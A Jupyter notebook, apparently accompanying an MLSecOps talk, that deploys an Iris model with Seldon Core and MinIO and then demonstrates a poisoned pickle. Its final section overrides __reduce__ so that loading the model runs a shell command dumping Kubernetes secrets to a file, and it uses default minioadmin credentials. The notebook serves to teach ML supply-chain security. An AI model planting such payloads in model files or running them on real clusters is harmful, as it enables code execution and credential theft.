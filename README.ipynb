{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e62f9c5a",
   "metadata": {},
   "source": [
    "# Flawed Machine Learning Security\n",
    "\n",
    "This Repo contains a set of resources relevant to the talk \"Secure Machine Learning at Scale with MLSecOps\", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "893c8dee",
   "metadata": {},
   "source": [
    "## Setup\n",
    "\n",
    "Requirements on CLIs\n",
    "* kubectl\n",
    "* istioctl\n",
    "* mc (minio client)\n",
    "* Kubernetes > 1.18\n",
    "* Python 3.7"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "baf12b42",
   "metadata": {},
   "source": [
    "### Setup Kubernetes Cluster"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c623753",
   "metadata": {},
   "source": [
    "#### Install and setup Istio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b49156ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "!istioctl install -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ffb9257",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl apply -n istio-system -f - << END\n",
    "apiVersion: networking.istio.io/v1alpha3\n",
    "kind: Gateway\n",
    "metadata:\n",
    "  name: seldon-gateway\n",
    "spec:\n",
    "  selector:\n",
    "    istio: ingressgateway # use istio default controller\n",
    "  servers:\n",
    "  - port:\n",
    "      number: 80\n",
    "      name: http\n",
    "      protocol: HTTP\n",
    "    hosts:\n",
    "    - \"*\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2500e0b5",
   "metadata": {},
   "source": [
    "#### Setup Seldon Core"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c25d3177",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "kubectl create ns seldon-system\n",
    "helm upgrade --install \\\n",
    "    seldon-core seldon-core-operator \\\n",
    "    --repo https://storage.googleapis.com/seldon-charts  \\\n",
    "    --set usageMetrics.enabled=true --namespace seldon-system \\\n",
    "    --set istio.enabled=\"true\" --set istio.gateway=\"seldon-gateway.istio-system.svc.cluster.local\" \\\n",
    "    --version 1.13.1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae15b724",
   "metadata": {},
   "source": [
    "#### Setup & configure MinIO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "7426d310",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"minio\" already exists with the same configuration, skipping\n",
      "NAME: minio\n",
      "LAST DEPLOYED: Sun Apr 10 13:24:52 2022\n",
      "NAMESPACE: minio-system\n",
      "STATUS: deployed\n",
      "REVISION: 1\n",
      "TEST SUITE: None\n",
      "NOTES:\n",
      "Minio can be accessed via port 9000 on the following DNS name from within your cluster:\n",
      "minio.minio-system.svc.cluster.local\n",
      "\n",
      "To access Minio from localhost, run the below commands:\n",
      "\n",
      "  1. export POD_NAME=$(kubectl get pods --namespace minio-system -l \"release=minio\" -o jsonpath=\"{.items[0].metadata.name}\")\n",
      "\n",
      "  2. kubectl port-forward $POD_NAME 9000 --namespace minio-system\n",
      "\n",
      "Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/\n",
      "\n",
      "You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:\n",
      "\n",
      "  1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide\n",
      "\n",
      "  2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.accesskey}\" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath=\"{.data.secretkey}\" | base64 --decode)\n",
      "\n",
      "  3. mc alias set minio-local http://localhost:9000 \"$ACCESS_KEY\" \"$SECRET_KEY\" --api s3v4\n",
      "\n",
      "  4. mc ls minio-local\n",
      "\n",
      "Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error from server (AlreadyExists): namespaces \"minio-system\" already exists\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl create ns minio-system\n",
    "helm repo add minio https://helm.min.io/\n",
    "helm install minio minio/minio \\\n",
    "    --set accessKey=minioadmin \\\n",
    "    --set secretKey=minioadmin \\\n",
    "    --namespace minio-system"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3ae7172",
   "metadata": {},
   "source": [
    "Once minio is runnning you need to open another terminal and run:\n",
    "```\n",
    "kubectl port-forward -n minio-system svc/minio 9000:9000\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "987c265e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[m\u001b[32mAdded `minio-seldon` successfully.\u001b[0m\r\n",
      "\u001b[0m"
     ]
    }
   ],
   "source": [
    "!mc config host add minio-seldon http://localhost:9000 minioadmin minioadmin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a40ed8da",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret/seldon-init-container-secret created\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl apply -f - << END\n",
    "apiVersion: v1\n",
    "kind: Secret\n",
    "metadata:\n",
    "  name: seldon-init-container-secret\n",
    "type: Opaque\n",
    "stringData:\n",
    "  RCLONE_CONFIG_S3_TYPE: s3\n",
    "  RCLONE_CONFIG_S3_PROVIDER: minio\n",
    "  RCLONE_CONFIG_S3_ACCESS_KEY_ID: minioadmin\n",
    "  RCLONE_CONFIG_S3_SECRET_ACCESS_KEY: minioadmin\n",
    "  RCLONE_CONFIG_S3_ENDPOINT: http://minio.minio-system.svc.cluster.local:9000\n",
    "  RCLONE_CONFIG_S3_ENV_AUTH: \"false\"\n",
    "END"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b3f0761",
   "metadata": {},
   "source": [
    "## Model Training"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f64e7d7",
   "metadata": {},
   "source": [
    "#### Install requirements for model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "dede9774",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing requirements.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile requirements.txt\n",
    "seldon_core\n",
    "scikit-learn == 0.24.2\n",
    "numpy >= 1.8.2\n",
    "joblib == 0.16.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef3e2843",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -r requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bfb8ddf8",
   "metadata": {},
   "source": [
    "#### Import datasets to train Iris model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ec3c173e",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn import datasets\n",
    "\n",
    "iris = datasets.load_iris()\n",
    "X, y = iris.data, iris.target"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f879e306",
   "metadata": {},
   "source": [
    "#### Import simple LogsticRegression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "ebe2e28f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "\n",
    "model = LogisticRegression(solver=\"liblinear\", multi_class='ovr')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2890f8d",
   "metadata": {},
   "source": [
    "#### Train model with dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1fe2830d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "LogisticRegression(multi_class='ovr', solver='liblinear')"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.fit(X, y)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21708962",
   "metadata": {},
   "source": [
    "#### Run prediction to test model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f9e7a349",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c30b1ff",
   "metadata": {},
   "source": [
    "#### Dump model binary with pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "bc828d40",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model.joblib']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import joblib\n",
    "\n",
    "joblib.dump(model, \"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "1e47114b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "�\u0003csklearn.linear_model._logistic\r\n",
      "LogisticRegression\r\n",
      "q\u0000)�q\u0001}q\u0002(X\u0007\u0000\u0000\u0000penaltyq\u0003X\u0002\u0000\u0000\u0000l2q\u0004X\u0004\u0000\u0000\u0000dualq\u0005�X\u0003\u0000\u0000\u0000tolq\u0006G?\u001a6��\u001c",
      "C-X\u0001\u0000\u0000\u0000Cq\u0007G?�\u0000\u0000\u0000\u0000\u0000\u0000X\r",
      "\u0000\u0000\u0000fit_interceptq\b�X\u0011\u0000\u0000\u0000intercept_scalingq\tK\u0001X\f",
      "\u0000\u0000\u0000class_weightq\r\n",
      "NX\f",
      "\u0000\u0000\u0000random_stateq\u000b",
      "NX\u0006\u0000\u0000\u0000solverq\f",
      "X\t\u0000\u0000\u0000liblinearq\r",
      "X\b\u0000\u0000\u0000max_iterq\u000eKdX\u000b",
      "\u0000\u0000\u0000multi_classq\u000fX\u0003\u0000\u0000\u0000ovrq\u0010X\u0007\u0000\u0000\u0000verboseq\u0011K\u0000X\r\n",
      "\u0000\u0000\u0000warm_startq\u0012�X\u0006\u0000\u0000\u0000n_jobsq\u0013NX\b\u0000\u0000\u0000l1_ratioq\u0014NX\u000e\u0000\u0000\u0000n_features_in_q\u0015K\u0004X\b\u0000\u0000\u0000classes_q\u0016cjoblib.numpy_pickle\r\n",
      "NumpyArrayWrapper\r\n",
      "q\u0017)�q\u0018}q\u0019(X\b\u0000\u0000\u0000subclassq\u001acnumpy\r\n",
      "ndarray\r\n",
      "q\u001bX\u0005\u0000\u0000\u0000shapeq\u001c",
      "K\u0003�q\u001d",
      "X\u0005\u0000\u0000\u0000orderq\u001e",
      "h\u0007X\u0005\u0000\u0000\u0000dtypeq\u001fcnumpy\r\n",
      "dtype\r\n",
      "q X\u0002\u0000\u0000\u0000i8q!���q\"Rq#(K\u0003X\u0001\u0000\u0000\u0000<q$NNNJ����J����K\u0000tq%bX\r\n",
      "\u0000\u0000\u0000allow_mmapq&�ub\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0002\u0000\u0000\u0000\u0000\u0000\u0000\u0000X\u0005\u0000\u0000\u0000coef_q'h\u0017)�q(}q)(h\u001ah\u001bh\u001c",
      "K\u0003K\u0004�q*h\u001e",
      "X\u0001\u0000\u0000\u0000Fq+h\u001fh X\u0002\u0000\u0000\u0000f8q,���q-Rq.(K\u0003h$NNNJ����J����K\u0000tq/bh&�ub, ?T�@�?�_5nM\\�?.z���Q��\u000b",
      "h|N5m�?w�$3:�����m�f���{�\u0001\u0001�\u0014\u0002�l��e\u0018m�?�s����\u0003@`�8�(V�\"\\}����\u0003M#\r\n",
      "fq\u0004@X\r\n",
      "\u0000\u0000\u0000intercept_q0h\u0017)�q1}q2(h\u001ah\u001bh\u001c",
      "K\u0003�q3h\u001e",
      "h\u0007h\u001fh.h&�ub�~?����?���'���??���ro�X\u0007\u0000\u0000\u0000n_iter_q4h\u0017)�q5}q6(h\u001ah\u001bh\u001c",
      "K\u0001�q7h\u001e",
      "h\u0007h\u001fh X\u0002\u0000\u0000\u0000i4q8���q9Rq:(K\u0003h$NNNJ����J����K\u0000tq;bh&�ub\u0007\u0000\u0000\u0000X\u0010\u0000\u0000\u0000_sklearn_versionq<X\u0006\u0000\u0000\u00000.24.2q=ub."
     ]
    }
   ],
   "source": [
    "!cat model.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fb6e5d7c",
   "metadata": {},
   "source": [
    "## Load Pickle and Inject Malicious Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "90b5d062",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_safe = joblib.load(\"model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "d31033be",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model_safe.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "43b094db",
   "metadata": {},
   "outputs": [],
   "source": [
    "import types, os\n",
    "\n",
    "def __reduce__(self):\n",
    "    cmd = \"kubectl get secrets -o yaml > kubernetes-secrets.txt\"\n",
    "    return os.system, (cmd,)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "17b88e19",
   "metadata": {},
   "outputs": [],
   "source": [
    "model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "9752ba8e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['model_unsafe.joblib']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "joblib.dump(model_safe, \"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "174db3e0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "�\u0003cposix\r\n",
      "system\r\n",
      "q\u0000X4\u0000\u0000\u0000kubectl get secrets -o yaml > kubernetes-secrets.txtq\u0001�q\u0002Rq\u0003."
     ]
    }
   ],
   "source": [
    "!cat model_unsafe.joblib"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "29be7552",
   "metadata": {},
   "source": [
    "#### Now reload the insecure pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "645e664c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access 'kubernetes-secrets.txt': No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "!ls kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "588ddadb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_unsafe = joblib.load(\"model_unsafe.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "b17bd883",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\r\n",
      "items:\r\n",
      "- apiVersion: v1\r\n",
      "  data:\r\n"
     ]
    }
   ],
   "source": [
    "!head -4 kubernetes-secrets.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "767ba74d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
